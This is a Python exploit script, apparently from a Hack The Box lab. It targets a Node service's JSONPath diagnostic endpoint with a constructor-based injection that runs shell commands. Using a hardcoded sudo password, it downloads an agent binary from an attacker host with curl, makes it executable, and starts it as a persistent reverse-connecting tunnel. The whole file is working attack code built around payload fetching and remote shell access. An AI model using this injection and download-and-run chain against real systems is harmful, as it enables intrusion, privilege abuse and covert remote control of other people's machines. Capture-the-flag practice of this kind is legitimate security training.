#!/usr/bin/env python3
import base64
import time
import requests

BASE = "http://10.129.115.125:3000"
HEADERS = {"Host": "aegis.korvia.htb"}
TOKEN = "bcdf42b953dcee715b8d81e38f0c5ded"
URL = f"{BASE}/api/v1/aegis-mds/_diag/{TOKEN}/jpquery"
PASS = "opc0932k90%%lODFI93-++"


def run(cmd: str, timeout: float = 25.0) -> None:
    b64 = base64.b64encode(cmd.encode()).decode()
    # Keep final expr under 512 chars: short wrapper
    wrapper = f"echo {b64}|base64 -d|bash"
    if len(wrapper) > 400:
        raise SystemExit(f"wrapper too long: {len(wrapper)}")
    inner = (
        "this.process.mainModule.require('child_process')"
        f".exec({wrapper!r})"
    )
    # exec expects a string - use the shell one-liner form from walkthrough
    inner = (
        "this.process.mainModule.require('child_process')"
        f".exec('echo {b64}|base64 -d|bash')"
    )
    expr = (
        f'$..[?(p="{inner};"'
        # fix: walkthrough format
    )
    expr = (
        f"$..[?(p=\"{inner}\";"
        f"Ethan=''[['constructor']][['constructor']](p);Ethan())]"
    )
    print(f"[*] ({len(expr)} chars) {cmd[:100]}")
    if len(expr) > 512:
        raise SystemExit(f"expr too long: {len(expr)}")
    try:
        r = requests.post(
            URL,
            headers=HEADERS,
            json={"context": "registration", "expr": expr},
            timeout=timeout,
        )
        print("   ", r.status_code, r.text[:150])
    except requests.exceptions.ReadTimeout:
        print("    timeout (ok)")


def main():
    run(f"echo {PASS} | sudo -S curl -fsSL -o /tmp/agent64 http://10.10.15.183:8090/agent64")
    time.sleep(12)
    run(f"echo {PASS} | sudo -S chmod +x /tmp/agent64; ls -la /tmp/agent64 > /tmp/ast")
    time.sleep(2)
    run(
        f"echo {PASS} | sudo -S bash -c "
        f"'pkill -f agent64; nohup /tmp/agent64 -connect 10.10.15.183:11601 "
        f"-ignore-cert >/tmp/agent.log 2>&1 &'"
    )
    time.sleep(4)
    run("cat /tmp/ast /tmp/agent.log; ps aux | grep agent64 | grep -v grep")


if __name__ == "__main__":
    main()
